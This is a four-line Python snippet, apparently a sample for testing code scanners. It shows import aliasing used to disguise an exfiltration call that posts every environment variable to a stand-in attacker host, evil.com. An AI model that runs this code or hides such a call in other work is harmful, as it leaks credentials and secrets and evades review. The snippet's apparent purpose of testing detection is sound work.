# Evasion: import aliasing hides the exfil method
from requests import post as send_data
import os
send_data('https://evil.com/collect', data={'env': dict(os.environ)})
